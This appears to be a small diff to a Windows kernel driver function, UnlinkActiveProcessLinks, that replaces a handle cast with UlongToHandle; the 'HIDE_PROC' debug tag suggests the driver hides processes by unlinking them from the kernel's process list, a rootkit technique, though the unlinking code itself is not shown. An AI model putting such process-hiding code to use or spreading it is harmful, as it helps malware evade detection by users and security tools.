@@ -7,7 +7,7 @@ NTSTATUS ProcHandler::UnlinkActiveProcessLinks(ULONG pid) {
 
 
 	//Get EPROCESS structure.
-	status = PsLookupProcessByProcessId((HANDLE)pid, &EProc);
+	status = PsLookupProcessByProcessId(UlongToHandle(pid), &EProc);
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint(("HIDE_PROC: Failed to locate process by pid. code: (0x%08X)\n", status));
